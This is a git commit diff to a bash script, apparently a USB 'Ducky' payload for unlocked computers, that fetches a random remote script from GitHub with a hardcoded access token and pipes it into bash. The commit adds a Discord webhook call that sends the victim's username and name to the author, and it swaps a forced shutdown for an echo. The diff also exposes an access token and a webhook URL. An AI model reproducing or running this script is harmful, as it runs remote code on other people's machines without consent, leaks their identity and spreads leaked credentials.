b58596bf70f6c0ece0e25f47515bd1717cc961dc
Waz0x <remy.noulin@epitech.eu>
2021-09-08 17:22:28 +0200

    MOD | added webhooks

--- script.sh
+++ script.sh
@@ -1,11 +1,16 @@
 #!/bin/bash
 
+export WEBHOOK_URL="https://discord.com/api/webhooks/885173629606834196/Lp9N3Wr86xcgRj2HzI9iOaMMql4Y5pL6iBdX-gQmFC2QhxrpXzuM4tSi6r4TIOJ9wXkA"
 rdm=$(( $RANDOM % 15 ))
 
 wget -q --spider http://google.com
 
 if [ $? -eq 0 ]; then
 	curl -s -H 'Authorization: token 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' "https://raw.githubusercontent.com/Waz0x/pc_delock_keur/master/scripts/$rdm.sh" | bash
+	curl \
+	  -H "Content-Type: application/json" \
+	  -d "{\"username\": \"Ducky\", \"content\":null,\"embeds\":[{\"title\":\"Script n°$rdm\", \"url\":\"https://github.com/Waz0x/pc_delock/blob/master/scripts/$rdm.sh\",\"color\":13704477,\"author\":{\"name\":\"$USER | $NAME\"},\"footer\":{\"text\":\"R.I.P.\"}}]}" $WEBHOOK_URL
 else
-	shutdown now
+	echo "yes"
+	#shutdown now
 fi
